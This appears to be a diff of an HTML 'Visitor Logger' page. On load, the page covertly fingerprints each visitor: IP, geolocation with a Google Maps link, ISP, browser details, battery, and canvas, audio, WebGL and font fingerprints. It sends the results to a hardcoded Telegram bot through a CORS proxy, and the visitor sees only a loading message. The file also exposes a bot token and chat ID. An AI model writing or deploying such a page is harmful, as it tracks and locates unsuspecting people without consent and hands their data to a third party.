@@ -2,84 +2,93 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Fingerprint Logger</title>
+  <title>Visitor Logger</title>
   <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
 </head>
 <body>
-  <h1>Loading...</h1>
+  <h1>Loading data...</h1>
   <script>
     const TELEGRAM_BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
     const CHAT_ID = "7218964278";
 
-    function getIPInfo() {
-      return fetch("https://ipapi.co/json")
-        .then(res => res.json())
-        .catch(() => ({}));
+    async function getIPInfo() {
+      try {
+        const res = await fetch("https://ipapi.co/json");
+        return await res.json();
+      } catch {
+        return {};
+      }
     }
 
-    function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const data = {
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: "Markdown"
-      };
-      fetch(url, {
+    async function getFingerprint() {
+      const fp = await FingerprintJS.load();
+      const result = await fp.get();
+      return result;
+    }
+
+    async function getBatteryInfo() {
+      if (navigator.getBattery) {
+        const b = await navigator.getBattery();
+        return `Level: ${Math.round(b.level * 100)}%, Charging: ${b.charging}`;
+      }
+      return "Not supported";
+    }
+
+    async function sendMessage(text) {
+      const proxy = "https://api.allorigins.win/raw?url=" + encodeURIComponent(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
+      );
+
+      await fetch(proxy, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "Markdown"
+        })
       });
     }
 
-    function collectData() {
-      Promise.all([
-        FingerprintJS.load().then(fp => fp.get()),
-        getIPInfo()
-      ]).then(([fpData, ipInfo]) => {
-        const nav = navigator;
-        const screenInfo = window.screen;
-        const message = `
-📡 *NEW VISITOR LOG*
+    async function main() {
+      const ipInfo = await getIPInfo();
+      const battery = await getBatteryInfo();
+      const fp = await getFingerprint();
+      const nav = navigator;
+      const screen = window.screen;
 
-🕵️ *IP Address:* ${ipInfo.ip || 'N/A'}
+      const mapLink = ipInfo.latitude && ipInfo.longitude
+        ? `[📍 Open Map](https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude})`
+        : 'Location not available';
+
+      const msg = `
+📥 *New Visitor Detected*
+
+🕹 *IP:* ${ipInfo.ip || 'Unknown'}
 🌍 *Location:* ${ipInfo.city || 'N/A'}, ${ipInfo.region || 'N/A'}, ${ipInfo.country_name || 'N/A'}
-📅 *Date/Time:* ${new Date().toLocaleString()}
+${mapLink}
 
-🧠 *Browser Info*
-- User-Agent: ${nav.userAgent}
-- Platform: ${nav.platform}
-- Language: ${nav.language}
-- Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+🧭 *ISP:* ${ipInfo.org || 'N/A'}
+🕰 *Timezone:* ${ipInfo.timezone || 'N/A'}
+📅 *Date:* ${new Date().toLocaleString()}
 
-🖥️ *Display*
-- Screen: ${screenInfo.width}x${screenInfo.height}
-- Window: ${window.innerWidth}x${window.innerHeight}
+🖥 *User Agent:* ${nav.userAgent}
+🗣 *Language:* ${nav.language}
+📏 *Screen:* ${screen.width}x${screen.height}
+🔋 *Battery:* ${battery}
 
-🔋 *Battery Status:* ${
-          nav.getBattery ? 'Checking...' : 'N/A'
-        }
+🧬 *Fingerprint:* \`${fp.visitorId}\`
+🎨 *Canvas:* ${fp.components.canvas?.value || 'N/A'}
+🎧 *Audio:* ${fp.components.audio?.value || 'N/A'}
+🧩 *WebGL:* ${fp.components.webgl?.value?.vendor || 'N/A'} / ${fp.components.webgl?.value?.renderer || 'N/A'}
+🔠 *Fonts:* ${fp.components.fonts?.value?.join(", ") || 'N/A'}
+      `.trim();
 
-🎨 *Canvas Fingerprint:* ${fpData.components.canvas?.value || 'N/A'}
-🧩 *WebGL Vendor:* ${fpData.components.webgl?.value?.vendor || 'N/A'}
-🧩 *WebGL Renderer:* ${fpData.components.webgl?.value?.renderer || 'N/A'}
-🔊 *Audio Fingerprint:* ${fpData.components.audio?.value || 'N/A'}
-🔠 *Fonts Detected:* ${fpData.components.fonts?.value?.join(", ") || 'N/A'}
-
-🧬 *Fingerprint ID:* \`${fpData.visitorId}\`
-        `;
-        sendToTelegram(message.trim());
-
-        // Check battery after send
-        if (nav.getBattery) {
-          nav.getBattery().then(battery => {
-            const batteryMsg = `🔋 *Battery:*\n- Level: ${battery.level * 100}%\n- Charging: ${battery.charging}`;
-            sendToTelegram(batteryMsg);
-          });
-        }
-      });
+      await sendMessage(msg);
+      document.body.innerHTML = "<h1>✅ Data berhasil dikirim ke Telegram!</h1>";
     }
 
-    collectData();
+    main();
   </script>
 </body>
 </html>
